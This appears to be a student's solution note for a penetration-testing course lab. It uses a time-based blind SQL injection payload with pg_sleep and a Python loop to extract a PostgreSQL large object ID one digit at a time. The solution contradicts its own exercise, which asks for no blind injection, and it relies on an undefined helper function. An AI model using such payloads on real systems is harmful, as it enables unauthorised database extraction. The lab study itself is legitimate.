# Extra Mile 5.8.2

*Use the SQL injection we discovered in this module to create a large object and retrieve the assigned LOID without the use of blind injection. Adapt your final proof of concept accordingly in order to employ this technique avoiding the use of a pre set LOID value (1337).*

Use time-based blind SQL injection to extract LOID value for injection.

```sql
-- Injection command: 
select case when substring(cast(loid as varchar),1,1)=$$8$$ then pg_sleep(3) else pg_sleep(0) end from pg_largeobject limit 1
```

The function `cast (loid as varchar)` converts the integer field LOID to a string that can be used with the substring command.

Data exfiltration code:

```python
loid = ""
for i in range(1,20):
	new_character = False
	for c in range(0,10):
		command = (f"select case when "
		f"substring(cast({column_name} as varchar),{i},1)=$${c}$$ "
		f"then pg_sleep(3) else pg_sleep(0) end from {table_name} limit 1")
		runtime = send_psql_command(ip=ip,command=command)
		if runtime > 3: # Correct character
			print(f"Adding new character: {c}")
			loid += str(c)
			new_character = True
			break

	if new_character == False: break
	
print(f"Found LOID: {loid}")
return int(loid)
```
